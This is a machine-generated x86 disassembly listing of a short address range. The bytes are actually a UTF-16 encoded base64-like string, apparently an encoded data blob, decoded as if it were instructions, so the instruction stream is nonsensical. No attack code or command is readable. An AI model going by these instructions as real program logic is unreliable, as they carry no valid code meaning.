  40ac2e:	76 00                	jbe    0x40ac30
  40ac30:	63 00                	arpl   %eax,(%eax)
  40ac32:	39 00                	cmp    %eax,(%eax)
  40ac34:	31 00                	xor    %eax,(%eax)
  40ac36:	76 00                	jbe    0x40ac38
  40ac38:	31 00                	xor    %eax,(%eax)
  40ac3a:	46                   	inc    %esi
  40ac3b:	00 56 00             	add    %dl,0x0(%esi)
  40ac3e:	59                   	pop    %ecx
  40ac3f:	00 62 00             	add    %ah,0x0(%edx)
  40ac42:	4c                   	dec    %esp
  40ac43:	00 71 00             	add    %dh,0x0(%ecx)
  40ac46:	66 00 65 00          	data16 add %ah,0x0(%ebp)
  40ac4a:	56                   	push   %esi
  40ac4b:	00 39                	add    %bh,(%ecx)
  40ac4d:	00 70 00             	add    %dh,0x0(%eax)
  40ac50:	71 00                	jno    0x40ac52
  40ac52:	63 00                	arpl   %eax,(%eax)
  40ac54:	2f                   	das
  40ac55:	00 74 00 32          	add    %dh,0x32(%eax,%eax,1)
  40ac59:	00 56 00             	add    %dl,0x0(%esi)
  40ac5c:	61                   	popa
  40ac5d:	00 47 00             	add    %al,0x0(%edi)
  40ac60:	4b                   	dec    %ebx
  40ac61:	00 57 00             	add    %dl,0x0(%edi)
  40ac64:	72 00                	jb     0x40ac66
  40ac66:	52                   	push   %edx
  40ac67:	00 37                	add    %dh,(%edi)
  40ac69:	00 2f                	add    %ch,(%edi)
  40ac6b:	00 47 00             	add    %al,0x0(%edi)
  40ac6e:	37                   	aaa
  40ac6f:	00 30                	add    %dh,(%eax)
  40ac71:	00 49 00             	add    %cl,0x0(%ecx)
  40ac74:	55                   	push   %ebp
  40ac75:	00 68 00             	add    %ch,0x0(%eax)
  40ac78:	47                   	inc    %edi
  40ac79:	00 4a 00             	add    %cl,0x0(%edx)
  40ac7c:	32 00                	xor    (%eax),%al
  40ac7e:	67 00 33             	add    %dh,(%bp,%di)
  40ac81:	00 4b 00             	add    %cl,0x0(%ebx)
  40ac84:	58                   	pop    %eax
  40ac85:	00 36                	add    %dh,(%esi)
  40ac87:	00 35 00 49 00 46    	add    %dh,0x46004900
  40ac8d:	00 71 00             	add    %dh,0x0(%ecx)
  40ac90:	67 00 48 00          	add    %cl,0x0(%bx,%si)
  40ac94:	2f                   	das
  40ac95:	00 4a 00             	add    %cl,0x0(%edx)
  40ac98:	48                   	dec    %eax
  40ac99:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ac9c:	3d 00 00 87 b1       	cmp    $0xb1870000,%eax
  40aca1:	68 00 58 00 44       	push   $0x44005800
  40aca6:	00 62 00             	add    %ah,0x0(%edx)
  40aca9:	54                   	push   %esp
  40acaa:	00 2f                	add    %ch,(%edi)
  40acac:	00 79 00             	add    %bh,0x0(%ecx)
  40acaf:	58                   	pop    %eax
  40acb0:	00 7a 00             	add    %bh,0x0(%edx)
  40acb3:	6f                   	outsl  %ds:(%esi),(%dx)
  40acb4:	00 4d 00             	add    %cl,0x0(%ebp)
  40acb7:	76 00                	jbe    0x40acb9
  40acb9:	6f                   	outsl  %ds:(%esi),(%dx)
  40acba:	00 4b 00             	add    %cl,0x0(%ebx)
  40acbd:	47                   	inc    %edi
  40acbe:	00 6e 00             	add    %ch,0x0(%esi)
  40acc1:	41                   	inc    %ecx
  40acc2:	00 54 00 4a          	add    %dl,0x4a(%eax,%eax,1)
  40acc6:	00 31                	add    %dh,(%ecx)
  40acc8:	00 6e 00             	add    %ch,0x0(%esi)
  40accb:	4a                   	dec    %edx
  40accc:	00 7a 00             	add    %bh,0x0(%edx)
  40accf:	76 00                	jbe    0x40acd1
  40acd1:	44                   	inc    %esp
  40acd2:	00 61 00             	add    %ah,0x0(%ecx)
  40acd5:	79 00                	jns    0x40acd7
  40acd7:	6c                   	insb   (%dx),%es:(%edi)
  40acd8:	00 41 00             	add    %al,0x0(%ecx)
  40acdb:	46                   	inc    %esi
  40acdc:	00 38                	add    %bh,(%eax)
  40acde:	00 35 00 4e 00 4c    	add    %dh,0x4c004e00
  40ace4:	00 76 00             	add    %dh,0x0(%esi)
  40ace7:	69 00 49 00 66 00    	imul   $0x660049,(%eax),%eax
  40aced:	50                   	push   %eax
  40acee:	00 43 00             	add    %al,0x0(%ebx)
  40acf1:	51                   	push   %ecx
  40acf2:	00 32                	add    %dh,(%edx)
  40acf4:	00 6e 00             	add    %ch,0x0(%esi)
  40acf7:	58                   	pop    %eax
  40acf8:	00 50 00             	add    %dl,0x0(%eax)
  40acfb:	35 00 2b 00 44       	xor    $0x44002b00,%eax
  40ad00:	00 7a 00             	add    %bh,0x0(%edx)
  40ad03:	76 00                	jbe    0x40ad05
  40ad05:	62 00                	bound  %eax,(%eax)
  40ad07:	58                   	pop    %eax
  40ad08:	00 4e 00             	add    %cl,0x0(%esi)
  40ad0b:	68 00 6e 00 74       	push   $0x74006e00
  40ad10:	00 35 00 6d 00 36    	add    %dh,0x36006d00
  40ad16:	00 32                	add    %dh,(%edx)
  40ad18:	00 53 00             	add    %dl,0x0(%ebx)
  40ad1b:	36 00 6f 00          	add    %ch,%ss:0x0(%edi)
  40ad1f:	65 00 71 00          	add    %dh,%gs:0x0(%ecx)
  40ad23:	44                   	inc    %esp
  40ad24:	00 37                	add    %dh,(%edi)
  40ad26:	00 46 00             	add    %al,0x0(%esi)
  40ad29:	69 00 71 00 65 00    	imul   $0x650071,(%eax),%eax
  40ad2f:	4f                   	dec    %edi
  40ad30:	00 6d 00             	add    %ch,0x0(%ebp)
  40ad33:	64 00 44 00 75       	add    %al,%fs:0x75(%eax,%eax,1)
  40ad38:	00 7a 00             	add    %bh,0x0(%edx)
  40ad3b:	72 00                	jb     0x40ad3d
  40ad3d:	42                   	inc    %edx
  40ad3e:	00 6a 00             	add    %ch,0x0(%edx)
  40ad41:	4f                   	dec    %edi
  40ad42:	00 41 00             	add    %al,0x0(%ecx)
  40ad45:	74 00                	je     0x40ad47
  40ad47:	2f                   	das
  40ad48:	00 63 00             	add    %ah,0x0(%ebx)
  40ad4b:	44                   	inc    %esp
  40ad4c:	00 6d 00             	add    %ch,0x0(%ebp)
  40ad4f:	37                   	aaa
  40ad50:	00 57 00             	add    %dl,0x0(%edi)
  40ad53:	4a                   	dec    %edx
  40ad54:	00 5a 00             	add    %bl,0x0(%edx)
  40ad57:	77 00                	ja     0x40ad59
  40ad59:	6b 00 73             	imul   $0x73,(%eax),%eax
  40ad5c:	00 68 00             	add    %ch,0x0(%eax)
  40ad5f:	36 00 72 00          	add    %dh,%ss:0x0(%edx)
  40ad63:	55                   	push   %ebp
  40ad64:	00 79 00             	add    %bh,0x0(%ecx)
  40ad67:	54                   	push   %esp
  40ad68:	00 75 00             	add    %dh,0x0(%ebp)
  40ad6b:	5a                   	pop    %edx
  40ad6c:	00 72 00             	add    %dh,0x0(%edx)
  40ad6f:	31 00                	xor    %eax,(%eax)
  40ad71:	46                   	inc    %esi
  40ad72:	00 47 00             	add    %al,0x0(%edi)
  40ad75:	32 00                	xor    (%eax),%al
  40ad77:	53                   	push   %ebx
  40ad78:	00 67 00             	add    %ah,0x0(%edi)
  40ad7b:	4c                   	dec    %esp
  40ad7c:	00 49 00             	add    %cl,0x0(%ecx)
  40ad7f:	51                   	push   %ecx
  40ad80:	00 4a 00             	add    %cl,0x0(%edx)
  40ad83:	2b 00                	sub    (%eax),%eax
  40ad85:	63 00                	arpl   %eax,(%eax)
  40ad87:	4c                   	dec    %esp
  40ad88:	00 32                	add    %dh,(%edx)
  40ad8a:	00 49 00             	add    %cl,0x0(%ecx)
  40ad8d:	47                   	inc    %edi
  40ad8e:	00 6f 00             	add    %ch,0x0(%edi)
  40ad91:	6a 00                	push   $0x0
  40ad93:	2b 00                	sub    (%eax),%eax
  40ad95:	54                   	push   %esp
  40ad96:	00 46 00             	add    %al,0x0(%esi)
  40ad99:	6a 00                	push   $0x0
  40ad9b:	65 00 51 00          	add    %dl,%gs:0x0(%ecx)
  40ad9f:	57                   	push   %edi
  40ada0:	00 41 00             	add    %al,0x0(%ecx)
  40ada3:	70 00                	jo     0x40ada5
  40ada5:	72 00                	jb     0x40ada7
  40ada7:	78 00                	js     0x40ada9
  40ada9:	73 00                	jae    0x40adab
  40adab:	63 00                	arpl   %eax,(%eax)
  40adad:	59                   	pop    %ecx
  40adae:	00 65 00             	add    %ah,0x0(%ebp)
  40adb1:	79 00                	jns    0x40adb3
  40adb3:	2b 00                	sub    (%eax),%eax
  40adb5:	37                   	aaa
  40adb6:	00 4e 00             	add    %cl,0x0(%esi)
  40adb9:	6d                   	insl   (%dx),%es:(%edi)
  40adba:	00 2f                	add    %ch,(%edi)
  40adbc:	00 54 00 64          	add    %dl,0x64(%eax,%eax,1)
  40adc0:	00 69 00             	add    %ch,0x0(%ecx)
  40adc3:	62 00                	bound  %eax,(%eax)
  40adc5:	55                   	push   %ebp
  40adc6:	00 75 00             	add    %dh,0x0(%ebp)
  40adc9:	57                   	push   %edi
  40adca:	00 37                	add    %dh,(%edi)
  40adcc:	00 31                	add    %dh,(%ecx)
  40adce:	00 52 00             	add    %dl,0x0(%edx)
  40add1:	71 00                	jno    0x40add3
  40add3:	6d                   	insl   (%dx),%es:(%edi)
  40add4:	00 70 00             	add    %dh,0x0(%eax)
  40add7:	74 00                	je     0x40add9
  40add9:	59                   	pop    %ecx
  40adda:	00 30                	add    %dh,(%eax)
  40addc:	00 64 00 68          	add    %ah,0x68(%eax,%eax,1)
  40ade0:	00 62 00             	add    %ah,0x0(%edx)
  40ade3:	78 00                	js     0x40ade5
  40ade5:	72 00                	jb     0x40ade7
  40ade7:	51                   	push   %ecx
  40ade8:	00 73 00             	add    %dh,0x0(%ebx)
  40adeb:	34 00                	xor    $0x0,%al
  40aded:	4c                   	dec    %esp
  40adee:	00 66 00             	add    %ah,0x0(%esi)
  40adf1:	51                   	push   %ecx
  40adf2:	00 2f                	add    %ch,(%edi)
  40adf4:	00 74 00 32          	add    %dh,0x32(%eax,%eax,1)
  40adf8:	00 4e 00             	add    %cl,0x0(%esi)
  40adfb:	53                   	push   %ebx
  40adfc:	00 74 00 4b          	add    %dh,0x4b(%eax,%eax,1)
  40ae00:	00 53 00             	add    %dl,0x0(%ebx)
  40ae03:	2f                   	das
  40ae04:	00 66 00             	add    %ah,0x0(%esi)
  40ae07:	5a                   	pop    %edx
  40ae08:	00 38                	add    %bh,(%eax)
  40ae0a:	00 48 00             	add    %cl,0x0(%eax)
  40ae0d:	4e                   	dec    %esi
  40ae0e:	00 43 00             	add    %al,0x0(%ebx)
  40ae11:	59                   	pop    %ecx
  40ae12:	00 4d 00             	add    %cl,0x0(%ebp)
  40ae15:	41                   	inc    %ecx
  40ae16:	00 2b                	add    %ch,(%ebx)
  40ae18:	00 50 00             	add    %dl,0x0(%eax)
  40ae1b:	78 00                	js     0x40ae1d
  40ae1d:	34 00                	xor    $0x0,%al
  40ae1f:	76 00                	jbe    0x40ae21
  40ae21:	6e                   	outsb  %ds:(%esi),(%dx)
  40ae22:	00 7a 00             	add    %bh,0x0(%edx)
  40ae25:	78 00                	js     0x40ae27
  40ae27:	59                   	pop    %ecx
  40ae28:	00 7a 00             	add    %bh,0x0(%edx)
  40ae2b:	51                   	push   %ecx
  40ae2c:	00 69 00             	add    %ch,0x0(%ecx)
  40ae2f:	41                   	inc    %ecx
  40ae30:	00 61 00             	add    %ah,0x0(%ecx)
  40ae33:	34 00                	xor    $0x0,%al
  40ae35:	76 00                	jbe    0x40ae37
  40ae37:	50                   	push   %eax
  40ae38:	00 4c 00 30          	add    %cl,0x30(%eax,%eax,1)
  40ae3c:	00 51 00             	add    %dl,0x0(%ecx)
  40ae3f:	39 00                	cmp    %eax,(%eax)
  40ae41:	2b 00                	sub    (%eax),%eax
  40ae43:	4b                   	dec    %ebx
  40ae44:	00 36                	add    %dh,(%esi)
  40ae46:	00 31                	add    %dh,(%ecx)
  40ae48:	00 77 00             	add    %dh,0x0(%edi)
  40ae4b:	6b 00 2f             	imul   $0x2f,(%eax),%eax
  40ae4e:	00 49 00             	add    %cl,0x0(%ecx)
  40ae51:	55                   	push   %ebp
  40ae52:	00 2f                	add    %ch,(%edi)
  40ae54:	00 7a 00             	add    %bh,0x0(%edx)
  40ae57:	45                   	inc    %ebp
  40ae58:	00 51 00             	add    %dl,0x0(%ecx)
  40ae5b:	49                   	dec    %ecx
  40ae5c:	00 43 00             	add    %al,0x0(%ebx)
  40ae5f:	67 00 42 00          	add    %al,0x0(%bp,%si)
  40ae63:	43                   	inc    %ebx
  40ae64:	00 66 00             	add    %ah,0x0(%esi)
  40ae67:	38 00                	cmp    %al,(%eax)
  40ae69:	48                   	dec    %eax
  40ae6a:	00 31                	add    %dh,(%ecx)
  40ae6c:	00 65 00             	add    %ah,0x0(%ebp)
  40ae6f:	41                   	inc    %ecx
  40ae70:	00 4a 00             	add    %cl,0x0(%edx)
  40ae73:	45                   	inc    %ebp
  40ae74:	00 51 00             	add    %dl,0x0(%ecx)
  40ae77:	74 00                	je     0x40ae79
  40ae79:	6b 00 41             	imul   $0x41,(%eax),%eax
  40ae7c:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ae7f:	41                   	inc    %ecx
  40ae80:	00 76 00             	add    %dh,0x0(%esi)
  40ae83:	64 00 39             	add    %bh,%fs:(%ecx)
  40ae86:	00 38                	add    %bh,(%eax)
  40ae88:	00 4e 00             	add    %cl,0x0(%esi)
  40ae8b:	69 00 6b 00 6d 00    	imul   $0x6d006b,(%eax),%eax
  40ae91:	78 00                	js     0x40ae93
  40ae93:	75 00                	jne    0x40ae95
  40ae95:	48                   	dec    %eax
  40ae96:	00 72 00             	add    %dh,0x0(%edx)
  40ae99:	73 00                	jae    0x40ae9b
  40ae9b:	74 00                	je     0x40ae9d
  40ae9d:	66 00 73 00          	data16 add %dh,0x0(%ebx)
  40aea1:	4a                   	dec    %edx
  40aea2:	00 2b                	add    %ch,(%ebx)
  40aea4:	00 4b 00             	add    %cl,0x0(%ebx)
  40aea7:	4a                   	dec    %edx
  40aea8:	00 53 00             	add    %dl,0x0(%ebx)
  40aeab:	55                   	push   %ebp
  40aeac:	00 34 00             	add    %dh,(%eax,%eax,1)
  40aeaf:	74 00                	je     0x40aeb1
  40aeb1:	6a 00                	push   $0x0
  40aeb3:	52                   	push   %edx
  40aeb4:	00 4c 00 6a          	add    %cl,0x6a(%eax,%eax,1)
  40aeb8:	00 37                	add    %dh,(%edi)
  40aeba:	00 6a 00             	add    %ch,0x0(%edx)
  40aebd:	71 00                	jno    0x40aebf
  40aebf:	4a                   	dec    %edx
  40aec0:	00 45 00             	add    %al,0x0(%ebp)
  40aec3:	41                   	inc    %ecx
  40aec4:	00 74 00 38          	add    %dh,0x38(%eax,%eax,1)
  40aec8:	00 30                	add    %dh,(%eax)
  40aeca:	00 74 00 5a          	add    %dh,0x5a(%eax,%eax,1)
  40aece:	00 6d 00             	add    %ch,0x0(%ebp)
  40aed1:	37                   	aaa
  40aed2:	00 36                	add    %dh,(%esi)
  40aed4:	00 75 00             	add    %dh,0x0(%ebp)
  40aed7:	6c                   	insb   (%dx),%es:(%edi)
  40aed8:	00 4a 00             	add    %cl,0x0(%edx)
  40aedb:	71 00                	jno    0x40aedd
  40aedd:	4d                   	dec    %ebp
  40aede:	00 76 00             	add    %dh,0x0(%esi)
  40aee1:	54                   	push   %esp
  40aee2:	00 70 00             	add    %dh,0x0(%eax)
  40aee5:	4a                   	dec    %edx
  40aee6:	00 63 00             	add    %ah,0x0(%ebx)
  40aee9:	42                   	inc    %edx
  40aeea:	00 56 00             	add    %dl,0x0(%esi)
  40aeed:	44                   	inc    %esp
  40aeee:	00 6f 00             	add    %ch,0x0(%edi)
  40aef1:	57                   	push   %edi
  40aef2:	00 65 00             	add    %ah,0x0(%ebp)
  40aef5:	51                   	push   %ecx
  40aef6:	00 43 00             	add    %al,0x0(%ebx)
  40aef9:	32 00                	xor    (%eax),%al
  40aefb:	4d                   	dec    %ebp
  40aefc:	00 78 00             	add    %bh,0x0(%eax)
  40aeff:	63 00                	arpl   %eax,(%eax)
  40af01:	7a 00                	jp     0x40af03
  40af03:	68 00 63 00 58       	push   $0x58006300
  40af08:	00 57 00             	add    %dl,0x0(%edi)
  40af0b:	5a                   	pop    %edx
  40af0c:	00 36                	add    %dh,(%esi)
  40af0e:	00 73 00             	add    %dh,0x0(%ebx)
  40af11:	4a                   	dec    %edx
  40af12:	00 65 00             	add    %ah,0x0(%ebp)
  40af15:	44                   	inc    %esp
  40af16:	00 6b 00             	add    %ch,0x0(%ebx)
  40af19:	6f                   	outsl  %ds:(%esi),(%dx)
  40af1a:	00 49 00             	add    %cl,0x0(%ecx)
  40af1d:	71 00                	jno    0x40af1f
  40af1f:	46                   	inc    %esi
  40af20:	00 4d 00             	add    %cl,0x0(%ebp)
  40af23:	2b 00                	sub    (%eax),%eax
  40af25:	70 00                	jo     0x40af27
  40af27:	75 00                	jne    0x40af29
  40af29:	6d                   	insl   (%dx),%es:(%edi)
  40af2a:	00 4f 00             	add    %cl,0x0(%edi)
  40af2d:	6d                   	insl   (%dx),%es:(%edi)
  40af2e:	00 77 00             	add    %dh,0x0(%edi)
  40af31:	42                   	inc    %edx
  40af32:	00 73 00             	add    %dh,0x0(%ebx)
  40af35:	79 00                	jns    0x40af37
  40af37:	6e                   	outsb  %ds:(%esi),(%dx)
  40af38:	00 72 00             	add    %dh,0x0(%edx)
  40af3b:	71 00                	jno    0x40af3d
  40af3d:	7a 00                	jp     0x40af3f
  40af3f:	62 00                	bound  %eax,(%eax)
  40af41:	44                   	inc    %esp
  40af42:	00 31                	add    %dh,(%ecx)
  40af44:	00 44 00 73          	add    %al,0x73(%eax,%eax,1)
  40af48:	00 55 00             	add    %dl,0x0(%ebp)
  40af4b:	32 00                	xor    (%eax),%al
  40af4d:	43                   	inc    %ebx
  40af4e:	00 50 00             	add    %dl,0x0(%eax)
  40af51:	61                   	popa
  40af52:	00 61 00             	add    %ah,0x0(%ecx)
  40af55:	68 00 4a 00 65       	push   $0x65004a00
  40af5a:	00 45 00             	add    %al,0x0(%ebp)
  40af5d:	50                   	push   %eax
  40af5e:	00 4d 00             	add    %cl,0x0(%ebp)
  40af61:	31 00                	xor    %eax,(%eax)
  40af63:	52                   	push   %edx
  40af64:	00 7a 00             	add    %bh,0x0(%edx)
  40af67:	68 00 72 00 6a       	push   $0x6a007200
  40af6c:	00 51 00             	add    %dl,0x0(%ecx)
  40af6f:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40af73:	73 00                	jae    0x40af75
  40af75:	7a 00                	jp     0x40af77
  40af77:	4e                   	dec    %esi
  40af78:	00 68 00             	add    %ch,0x0(%eax)
  40af7b:	30 00                	xor    %al,(%eax)
  40af7d:	44                   	inc    %esp
  40af7e:	00 46 00             	add    %al,0x0(%esi)
  40af81:	57                   	push   %edi
  40af82:	00 4e 00             	add    %cl,0x0(%esi)
  40af85:	63 00                	arpl   %eax,(%eax)
  40af87:	76 00                	jbe    0x40af89
  40af89:	45                   	inc    %ebp
  40af8a:	00 77 00             	add    %dh,0x0(%edi)
  40af8d:	6b 00 75             	imul   $0x75,(%eax),%eax
  40af90:	00 2f                	add    %ch,(%edi)
  40af92:	00 57 00             	add    %dl,0x0(%edi)
  40af95:	72 00                	jb     0x40af97
  40af97:	2b 00                	sub    (%eax),%eax
  40af99:	55                   	push   %ebp
  40af9a:	00 79 00             	add    %bh,0x0(%ecx)
  40af9d:	52                   	push   %edx
  40af9e:	00 70 00             	add    %dh,0x0(%eax)
  40afa1:	6f                   	outsl  %ds:(%esi),(%dx)
  40afa2:	00 73 00             	add    %dh,0x0(%ebx)
  40afa5:	36 00 36             	add    %dh,%ss:(%esi)
  40afa8:	00 45 00             	add    %al,0x0(%ebp)
  40afab:	4a                   	dec    %edx
  40afac:	00 6e 00             	add    %ch,0x0(%esi)
  40afaf:	72 00                	jb     0x40afb1
  40afb1:	42                   	inc    %edx
  40afb2:	00 70 00             	add    %dh,0x0(%eax)
  40afb5:	4d                   	dec    %ebp
  40afb6:	00 5a 00             	add    %bl,0x0(%edx)
  40afb9:	45                   	inc    %ebp
  40afba:	00 41 00             	add    %al,0x0(%ecx)
  40afbd:	77 00                	ja     0x40afbf
  40afbf:	7a 00                	jp     0x40afc1
  40afc1:	4e                   	dec    %esi
  40afc2:	00 33                	add    %dh,(%ebx)
  40afc4:	00 2f                	add    %ch,(%edi)
  40afc6:	00 4d 00             	add    %cl,0x0(%ebp)
  40afc9:	52                   	push   %edx
  40afca:	00 63 00             	add    %ah,0x0(%ebx)
  40afcd:	48                   	dec    %eax
  40afce:	00 67 00             	add    %ah,0x0(%edi)
  40afd1:	32 00                	xor    (%eax),%al
  40afd3:	67 00 55 00          	add    %dl,0x0(%di)
  40afd7:	57                   	push   %edi
  40afd8:	00 67 00             	add    %ah,0x0(%edi)
  40afdb:	73 00                	jae    0x40afdd
  40afdd:	4f                   	dec    %edi
  40afde:	00 5a 00             	add    %bl,0x0(%edx)
  40afe1:	57                   	push   %edi
  40afe2:	00 6b 00             	add    %ch,0x0(%ebx)
  40afe5:	35 00 36 00 47       	xor    $0x47003600,%eax
  40afea:	00 30                	add    %dh,(%eax)
  40afec:	00 30                	add    %dh,(%eax)
  40afee:	00 44 00 53          	add    %al,0x53(%eax,%eax,1)
  40aff2:	00 47 00             	add    %al,0x0(%edi)
  40aff5:	51                   	push   %ecx
  40aff6:	00 32                	add    %dh,(%edx)
  40aff8:	00 34 00             	add    %dh,(%eax,%eax,1)
  40affb:	6c                   	insb   (%dx),%es:(%edi)
  40affc:	00 37                	add    %dh,(%edi)
  40affe:	00 70 00             	add    %dh,0x0(%eax)
  40b001:	71 00                	jno    0x40b003
  40b003:	7a 00                	jp     0x40b005
  40b005:	55                   	push   %ebp
  40b006:	00 4d 00             	add    %cl,0x0(%ebp)
  40b009:	44                   	inc    %esp
  40b00a:	00 65 00             	add    %ah,0x0(%ebp)
  40b00d:	69 00 77 00 51 00    	imul   $0x510077,(%eax),%eax
  40b013:	66 00 38             	data16 add %bh,(%eax)
  40b016:	00 62 00             	add    %ah,0x0(%edx)
  40b019:	2b 00                	sub    (%eax),%eax
  40b01b:	4d                   	dec    %ebp
  40b01c:	00 6d 00             	add    %ch,0x0(%ebp)
  40b01f:	7a 00                	jp     0x40b021
  40b021:	47                   	inc    %edi
  40b022:	00 54 00 6c          	add    %dl,0x6c(%eax,%eax,1)
  40b026:	00 31                	add    %dh,(%ecx)
  40b028:	00 46 00             	add    %al,0x0(%esi)
  40b02b:	6b 00 68             	imul   $0x68,(%eax),%eax
  40b02e:	00 47 00             	add    %al,0x0(%edi)
  40b031:	6f                   	outsl  %ds:(%esi),(%dx)
  40b032:	00 55 00             	add    %dl,0x0(%ebp)
  40b035:	6b 00 51             	imul   $0x51,(%eax),%eax
  40b038:	00 78 00             	add    %bh,0x0(%eax)
  40b03b:	63 00                	arpl   %eax,(%eax)
  40b03d:	49                   	dec    %ecx
  40b03e:	00 71 00             	add    %dh,0x0(%ecx)
  40b041:	59                   	pop    %ecx
  40b042:	00 5a 00             	add    %bl,0x0(%edx)
  40b045:	33 00                	xor    (%eax),%eax
  40b047:	35 00 50 00 36       	xor    $0x36005000,%eax
  40b04c:	00 50 00             	add    %dl,0x0(%eax)
  40b04f:	68 00 46 00 38       	push   $0x38004600
  40b054:	00 38                	add    %bh,(%eax)
  40b056:	00 2b                	add    %ch,(%ebx)
  40b058:	00 47 00             	add    %al,0x0(%edi)
  40b05b:	62 00                	bound  %eax,(%eax)
  40b05d:	32 00                	xor    (%eax),%al
  40b05f:	68 00 36 00 4b       	push   $0x4b003600
  40b064:	00 66 00             	add    %ah,0x0(%esi)
  40b067:	4b                   	dec    %ebx
  40b068:	00 55 00             	add    %dl,0x0(%ebp)
  40b06b:	39 00                	cmp    %eax,(%eax)
  40b06d:	7a 00                	jp     0x40b06f
  40b06f:	55                   	push   %ebp
  40b070:	00 4f 00             	add    %cl,0x0(%edi)
  40b073:	56                   	push   %esi
  40b074:	00 48 00             	add    %cl,0x0(%eax)
  40b077:	2b 00                	sub    (%eax),%eax
  40b079:	4c                   	dec    %esp
  40b07a:	00 74 00 7a          	add    %dh,0x7a(%eax,%eax,1)
  40b07e:	00 44 00 6c          	add    %al,0x6c(%eax,%eax,1)
  40b082:	00 33                	add    %dh,(%ebx)
  40b084:	00 71 00             	add    %dh,0x0(%ecx)
  40b087:	6b 00 2b             	imul   $0x2b,(%eax),%eax
  40b08a:	00 30                	add    %dh,(%eax)
  40b08c:	00 49 00             	add    %cl,0x0(%ecx)
  40b08f:	2f                   	das
  40b090:	00 43 00             	add    %al,0x0(%ebx)
  40b093:	67 00 57 00          	add    %dl,0x0(%bx)
  40b097:	78 00                	js     0x40b099
  40b099:	79 00                	jns    0x40b09b
  40b09b:	56                   	push   %esi
  40b09c:	00 31                	add    %dh,(%ecx)
  40b09e:	00 42 00             	add    %al,0x0(%edx)
  40b0a1:	74 00                	je     0x40b0a3
  40b0a3:	37                   	aaa
  40b0a4:	00 74 00 66          	add    %dh,0x66(%eax,%eax,1)
  40b0a8:	00 32                	add    %dh,(%edx)
  40b0aa:	00 2b                	add    %ch,(%ebx)
  40b0ac:	00 42 00             	add    %al,0x0(%edx)
  40b0af:	6c                   	insb   (%dx),%es:(%edi)
  40b0b0:	00 73 00             	add    %dh,0x0(%ebx)
  40b0b3:	56                   	push   %esi
  40b0b4:	00 74 00 42          	add    %dh,0x42(%eax,%eax,1)
  40b0b8:	00 4b 00             	add    %cl,0x0(%ebx)
  40b0bb:	61                   	popa
  40b0bc:	00 4f 00             	add    %cl,0x0(%edi)
  40b0bf:	30 00                	xor    %al,(%eax)
  40b0c1:	69 00 32 00 63 00    	imul   $0x630032,(%eax),%eax
  40b0c7:	35 00 70 00 72       	xor    $0x72007000,%eax
  40b0cc:	00 72 00             	add    %dh,0x0(%edx)
  40b0cf:	6b 00 6a             	imul   $0x6a,(%eax),%eax
  40b0d2:	00 44 00 4a          	add    %al,0x4a(%eax,%eax,1)
  40b0d6:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b0d9:	79 00                	jns    0x40b0db
  40b0db:	6b 00 33             	imul   $0x33,(%eax),%eax
  40b0de:	00 56 00             	add    %dl,0x0(%esi)
  40b0e1:	64 00 71 00          	add    %dh,%fs:0x0(%ecx)
  40b0e5:	52                   	push   %edx
  40b0e6:	00 4b 00             	add    %cl,0x0(%ebx)
  40b0e9:	61                   	popa
  40b0ea:	00 6f 00             	add    %ch,0x0(%edi)
  40b0ed:	72 00                	jb     0x40b0ef
  40b0ef:	73 00                	jae    0x40b0f1
  40b0f1:	51                   	push   %ecx
  40b0f2:	00 65 00             	add    %ah,0x0(%ebp)
  40b0f5:	49                   	dec    %ecx
  40b0f6:	00 4f 00             	add    %cl,0x0(%edi)
  40b0f9:	4f                   	dec    %edi
  40b0fa:	00 58 00             	add    %bl,0x0(%eax)
  40b0fd:	68 00 37 00 47       	push   $0x47003700
  40b102:	00 42 00             	add    %al,0x0(%edx)
  40b105:	73 00                	jae    0x40b107
  40b107:	4f                   	dec    %edi
  40b108:	00 69 00             	add    %ch,0x0(%ecx)
  40b10b:	53                   	push   %ebx
  40b10c:	00 30                	add    %dh,(%eax)
  40b10e:	00 50 00             	add    %dl,0x0(%eax)
  40b111:	71 00                	jno    0x40b113
  40b113:	6f                   	outsl  %ds:(%esi),(%dx)
  40b114:	00 58 00             	add    %bl,0x0(%eax)
  40b117:	6e                   	outsb  %ds:(%esi),(%dx)
  40b118:	00 6a 00             	add    %ch,0x0(%edx)
  40b11b:	71 00                	jno    0x40b11d
  40b11d:	32 00                	xor    (%eax),%al
  40b11f:	37                   	aaa
  40b120:	00 4d 00             	add    %cl,0x0(%ebp)
  40b123:	37                   	aaa
  40b124:	00 53 00             	add    %dl,0x0(%ebx)
  40b127:	39 00                	cmp    %eax,(%eax)
  40b129:	41                   	inc    %ecx
  40b12a:	00 4e 00             	add    %cl,0x0(%esi)
  40b12d:	35 00 4c 00 55       	xor    $0x55004c00,%eax
  40b132:	00 38                	add    %bh,(%eax)
  40b134:	00 51 00             	add    %dl,0x0(%ecx)
  40b137:	52                   	push   %edx
  40b138:	00 72 00             	add    %dh,0x0(%edx)
  40b13b:	33 00                	xor    (%eax),%eax
  40b13d:	33 00                	xor    (%eax),%eax
  40b13f:	30 00                	xor    %al,(%eax)
  40b141:	36 00 57 00          	add    %dl,%ss:0x0(%edi)
  40b145:	59                   	pop    %ecx
  40b146:	00 67 00             	add    %ah,0x0(%edi)
  40b149:	4b                   	dec    %ebx
  40b14a:	00 61 00             	add    %ah,0x0(%ecx)
  40b14d:	42                   	inc    %edx
  40b14e:	00 6b 00             	add    %ch,0x0(%ebx)
  40b151:	62 00                	bound  %eax,(%eax)
  40b153:	75 00                	jne    0x40b155
  40b155:	66 00 54 00 7a       	data16 add %dl,0x7a(%eax,%eax,1)
  40b15a:	00 48 00             	add    %cl,0x0(%eax)
  40b15d:	67 00 4c 00          	add    %cl,0x0(%si)
  40b161:	47                   	inc    %edi
  40b162:	00 57 00             	add    %dl,0x0(%edi)
  40b165:	6b 00 6a             	imul   $0x6a,(%eax),%eax
  40b168:	00 36                	add    %dh,(%esi)
  40b16a:	00 61 00             	add    %ah,0x0(%ecx)
  40b16d:	41                   	inc    %ecx
  40b16e:	00 74 00 4c          	add    %dh,0x4c(%eax,%eax,1)
  40b172:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40b176:	00 77 00             	add    %dh,0x0(%edi)
  40b179:	6c                   	insb   (%dx),%es:(%edi)
  40b17a:	00 54 00 73          	add    %dl,0x73(%eax,%eax,1)
  40b17e:	00 68 00             	add    %ch,0x0(%eax)
